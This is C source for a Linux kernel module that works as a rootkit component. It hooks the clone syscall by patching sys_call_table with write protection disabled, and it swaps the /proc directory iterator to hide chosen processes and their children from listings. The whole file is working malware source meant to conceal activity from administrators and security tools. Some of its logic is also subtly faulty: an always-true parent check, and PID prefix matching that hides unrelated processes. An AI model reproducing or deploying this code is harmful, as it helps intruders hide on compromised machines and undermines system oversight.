/**
 * hide_process.c
 *
 * Hide processes by overwriting fops of proc dir. Possibility to hide all child processes, including new children.
 */

#include <linux/module.h>	
#include <linux/kernel.h>
#include <linux/init.h>	

#include <linux/pid.h>

#include "hook.h"

#include <asm/uaccess.h>
#include <linux/sched.h> // for task struct and find_task_by_vpid(pid_t nr);

//for fork hook
#include <asm/unistd.h>
#include <linux/kallsyms.h>
#include <asm/paravirt.h> /* write_cr0 */

#include <linux/list.h>


#include <linux/types.h>

/************** Defines ******************/

#define DEBUG_MODULE 	0

#if DEBUG_MODULE == 0
#undef DEBUG(f_, ...)
#define DEBUG(f_, ...)
#endif

#define HIDE_CHILD_PROCESSES_DEFAULT	1

/************** Prototypes ***************/
static int procfs_filldir_t(struct dir_context *ctx, const char *proc_name,
		int len, loff_t off, u64 ino, unsigned int d_type);
static int procfs_iterate_shared(struct file *file, struct dir_context *ctx);

asmlinkage long (*old_fork)(void);
//asmlinkage long (*old_vfork)(void);
asmlinkage long (*old_clone)(unsigned long, unsigned long, int __user *, unsigned long,
		int __user *);

/************* Data structures ************/
LIST_HEAD( hidden_processes_list);

struct ps_entry {
	pid_t pid;
	struct list_head list;
};

/* file operation copy's/pointers */
static struct file_operations own_file_ops_proc;
static struct file_operations *backup_file_ops_proc;
static struct inode *proc_inode;
struct dir_context *backup_ctx_proc;

struct dir_context procfs_ctx = { .actor = procfs_filldir_t, };

static void **sys_call_table;

static int hide_child_flag = HIDE_CHILD_PROCESSES_DEFAULT;

/******** Implementation **************/

/**
 *
 */

void turn_child_hiding_off(void){

	hide_child_flag = 0;
}

void turn_child_hiding_on(void){
	hide_child_flag = 1;
}


/*
 * returns 1 if pid is in hidden list, 0 otheriwse
 */
int is_hidden(pid_t pid) {
	struct ps_entry *existing_entry, *tmp;

	/* check if is already in list */
	list_for_each_entry_safe(existing_entry, tmp, &hidden_processes_list, list)
	{
		if (existing_entry->pid == pid) {
			/* There is already an entry in the list */
			return 1;
		}
	}
	return 0;

}

/*
 * returns 1 if pid belongs to a process which is a child of a hidden process, 0 otherwise
 */
int is_child_of_hidden_process(pid_t pid) {
	struct task_struct *ps_task_struct;
	pid_t pid_parent;
	ps_task_struct = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!ps_task_struct)
		return -1;
	pid_parent = ps_task_struct->parent->pid;
	DEBUG("parent %d of child %d",pid_parent,pid);
	if (is_hidden(pid_parent))
		return 1;
	else if (pid_parent != 0 || pid_parent != 1)
		return is_child_of_hidden_process(pid_parent);
	else
		return 0;
}
/*
 *
 * returns true if process with pid1 is child of process with pid2
 */
int is_child_of(pid_t pid1, pid_t pid2) {
	struct task_struct *ps1_task_struct;
	pid_t pid1_parent;
	ps1_task_struct = pid_task(find_vpid(pid1), PIDTYPE_PID);
	if (!ps1_task_struct)
		return -1;
	pid1_parent = ps1_task_struct->parent->pid;

	if (pid1_parent == pid2)
		return 1;
	else if (pid1_parent != 0 || pid1_parent != 1)
		return is_child_of(pid1_parent, pid2);
	else
		return 0;

}

// fork hook
asmlinkage long new_clone(unsigned long a, unsigned long b, int __user *c, unsigned long d, int __user *e){

	pid_t pid = (pid_t)old_clone(a,b,c,d,e);

	DEBUG("fork with pid %d \n", pid);

	if(hide_child_flag){
		if(is_child_of_hidden_process(pid)){
			DEBUG("Hide pid %d as child of hidden pid", pid);
			add_pid_to_hide(pid);
		}
	}

	return pid;
}

/**
 * Initialize function to hide processes.
 */
void initialize_process_hiding(void) {
	struct path path;

	sys_call_table = (void **) kallsyms_lookup_name("sys_call_table");

	// hook sys_clone == fork()
	write_cr0(read_cr0() & (~0x10000));

	/* Save reference to original read pointer */
	//old_fork = (void *)sys_call_table[__NR_fork];
	old_clone = (void *) sys_call_table[__NR_clone];

	/* Enter own read syscall in table */
	//sys_call_table[__NR_fork] = (unsigned long*)new_fork;
	sys_call_table[__NR_clone] = (unsigned long*) new_clone;

	/* reenable write protection */
	write_cr0(read_cr0() | 0x10000);

	/* fetch the procfs entry */
	if (kern_path("/proc", 0, &path)) {
		return;
	}

	// insert own fops for /proc

	/* get the inode*/
	proc_inode = path.dentry->d_inode;

	/* get a copy of file_operations from inode */
	own_file_ops_proc = *proc_inode->i_fop;
	/* backup the file_operations */
	backup_file_ops_proc = (struct file_operations *) proc_inode->i_fop;
	/* modify the copy without own iterate function */
	own_file_ops_proc.iterate_shared = procfs_iterate_shared;
	/* set the file operations pointer onto our own file operations */
	proc_inode->i_fop = &own_file_ops_proc;
	//static atomic64_t * atomic_fop;
	//atomic_fop = (atomic64_t *)&proc_inode->i_fop;
	//atomic64_set(atomic_fop, (unsigned long)&own_file_ops_proc);

	return;
}

/**
 * Cleanup function for hiding processes.
 */
void remove_process_hiding(void) {
	struct ps_entry *existing_entry, *tmp;

	/* remove write protection */
	write_cr0(read_cr0() & (~0x10000));

	//sys_call_table[__NR_fork] = (unsigned long *)old_fork;
	sys_call_table[__NR_clone] = (unsigned long *) old_clone;
	/* reenable write protection*/
	write_cr0(read_cr0() | 0x10000);

	/* set the file operations back to original */
	proc_inode->i_fop = backup_file_ops_proc;

	// clean up (free) hidden_proccesses list

	list_for_each_entry_safe(existing_entry, tmp, &hidden_processes_list, list)
	{
		list_del(&(existing_entry->list));
		kfree(existing_entry);
	}

}

/**
 * Adds a PID whichs process will be hidden
 * return 0 if success, otherwise -1.
 */
int add_pid_to_hide(pid_t pid) {
	struct list_head *p;
	struct ps_entry *new_entry;
	struct task_struct *child_existing_entry, *child_tmp, *ps_task_struct;

	if (is_hidden(pid)) {
		return 0; // nothing to do
	}

	//add already existing children to hidden list
	if (hide_child_flag) {
		DEBUG("here");
		ps_task_struct = pid_task(find_vpid(pid), PIDTYPE_PID);
		if (!ps_task_struct) {
			DEBUG("ERROR, couldnt find task struct for given pid %d", pid);
			return -1;
		}
		list_for_each_entry_safe(child_existing_entry, child_tmp, &(ps_task_struct->children), sibling)
		{
			DEBUG("Hide pid %d as child of hidden pid da", child_existing_entry->pid);
			add_pid_to_hide(child_existing_entry->pid);
		}

		/*list_for_each(p,  &(ps_task_struct->children)){
		child_existing_entry = *list_entry(p,struct task_struct,sibling);
		DEBUG("Hide pid %d as child of hidden pid da", child_existing_entry.pid);
		add_pid_to_hide(child_existing_entry.pid);
	}*/
	}


	new_entry = kmalloc(sizeof(struct ps_entry), GFP_KERNEL);
	if (!new_entry) {
		return -1;
	}

	//memcpy ( new_entry_v4->ipv4_addr, ipv4_addr, IPV4_LENGTH );
	new_entry->pid = pid;
	list_add(&new_entry->list, &hidden_processes_list);


	return 0;
}

/*
 * Removes a PID from the hidden list.
 */
void remove_pid_to_hide(pid_t pid) {
	struct ps_entry *existing_entry, *tmp;

	// del children from list

	list_for_each_entry_safe(existing_entry, tmp, &hidden_processes_list, list)
	{
		if (is_child_of(existing_entry->pid, pid)) {
			// if entry is in list, remove it
			list_del(&(existing_entry->list));
			kfree(existing_entry);
		}
	}

	// del pid from list
	list_for_each_entry_safe(existing_entry, tmp, &hidden_processes_list, list)
	{
		if (existing_entry->pid == pid) {
			// if entry is in list, remove it
			list_del(&(existing_entry->list));
			kfree(existing_entry);
		}
	}

	return;
}

/**
 * Replacement function for the proc folder.
 * return 0 if a file/dir is the one of the searched file, otherwise return the original function.
 */
static int procfs_filldir_t(struct dir_context *ctx, const char *proc_name,
		int len, loff_t off, u64 ino, unsigned int d_type) {
	/* for hiding PIDs */

	struct ps_entry *existing_entry, *tmp;

	list_for_each_entry_safe(existing_entry, tmp, &hidden_processes_list, list)
	{
		char pid_as_string[20];
		sprintf(pid_as_string, "%d", existing_entry->pid);
		if (strncmp(proc_name, pid_as_string, strlen(pid_as_string)) == 0) {
			return 0;
		}
	}

	/* if should not be hidden, call original function and pass results */
	return backup_ctx_proc->actor(backup_ctx_proc, proc_name, len, off, ino, d_type);
}

/**
 * Replacement iterate function, makes sure filldir function gets inserted.
 */
static int procfs_iterate_shared(struct file *file, struct dir_context *ctx) {
	int result = 0;
	procfs_ctx.pos = ctx->pos;
	backup_ctx_proc = ctx;
	result = backup_file_ops_proc->iterate_shared(file, &procfs_ctx);
	ctx->pos = procfs_ctx.pos;

	return result;
}

